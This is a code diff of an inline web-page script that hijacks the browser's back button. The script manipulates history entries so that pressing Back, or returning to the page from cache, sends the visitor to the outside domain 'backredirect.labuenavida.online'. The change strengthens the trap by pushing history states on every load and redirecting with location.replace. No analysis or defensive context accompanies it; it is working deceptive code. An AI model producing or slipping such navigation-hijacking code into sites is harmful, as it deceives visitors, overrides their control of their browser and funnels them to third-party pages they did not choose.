@@ -1763,15 +1763,15 @@
 <script>
 (function() {
   var REDIRECT = 'https://backredirect.labuenavida.online/';
-  function go() { window.location.href = REDIRECT; }
-
-  if (!location.hash) {
-    history.replaceState(null, '', location.pathname + '#s1');
+  function go() {
     history.pushState(null, '', location.pathname + '#s2');
+    window.location.replace(REDIRECT);
   }
 
+  history.replaceState(null, '', location.pathname + '#s1');
+  history.pushState(null, '', location.pathname + '#s2');
+
   window.addEventListener('popstate', go);
-  window.addEventListener('hashchange', go);
   window.addEventListener('pageshow', function(e) { if (e.persisted) go(); });
 })();
 </script>
